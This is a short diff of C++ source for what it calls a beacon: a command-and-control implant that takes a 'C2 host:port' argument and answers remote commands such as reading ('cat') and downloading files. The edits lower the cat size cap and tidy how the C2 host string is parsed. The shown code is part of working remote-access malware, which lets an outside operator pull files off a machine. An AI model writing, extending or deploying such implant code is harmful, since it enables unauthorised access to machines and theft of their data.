@@ -286,7 +286,7 @@ std::string dispatch_command(const std::string& cmd) {
         
         f.seekg(0, std::ios::end);
         size_t size = f.tellg();
-        if (size > 5 * 1024 * 1024) return "Error: File too large to cat (max 5MB). Use download.";
+        if (size > 1 * 1024 * 1024) return "Error: File too large to cat (max 1MB). Use download.";
         f.seekg(0, std::ios::beg);
         
         std::ostringstream ss;
@@ -353,7 +353,8 @@ void beacon_main(int argc, char** argv) {
 
     // Parse command line for C2 host:port (e.g., "beacon 192.168.1.100 8443")
     if (argc >= 2) {
-        cfg.host = std::wstring(std::string(argv[1]).begin(), std::string(argv[1]).end());
+        std::string host_str(argv[1]);
+        cfg.host = std::wstring(host_str.begin(), host_str.end());
         if (argc >= 3) cfg.port = std::atoi(argv[2]);
     }
 
